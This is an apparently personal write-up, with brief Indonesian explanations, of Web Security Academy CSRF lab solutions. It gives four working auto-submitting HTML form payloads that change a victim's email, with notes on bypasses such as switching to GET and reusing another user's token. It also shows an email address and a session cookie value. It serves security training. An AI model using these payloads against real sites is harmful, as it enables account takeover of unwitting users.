### CSRF vulnerability with no defenses

**Payload** : 
```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal2002@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```
**Penjelasan** : 

### CSRF where token validation depends on request method

**Payload** : 
```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal2002@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```
**Penjelasan** : 
Karena dalam judul, jadi bisa dicoba dengan method GET

### CSRF where token validation depends on token being present

**Payload** : 
```html
head :
Cookie: session=qkBc0hNjc0fwjRidYihPjyt3BsjYYIqG

<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal2002@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
```
**Penjelasan** : 
Dibutuhkanya cookie, namun tidak memvalidasi session siapa

### CSRF where token is not tied to user session

**Payload** : 
```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal2002@gmail.com">
    <input type="hidden" name="csrf" value="$csrfTokenFromValidUser$">
</form>
<script>
    document.forms[0].submit();
</script>
```
**Penjelasan** : 
Dibutuhkanya csrf token yang valid, dengan begitu. penyerang bisa masuk ke akun yang valid terlebih dahulu, untuk mendapatkan csrf token yang valid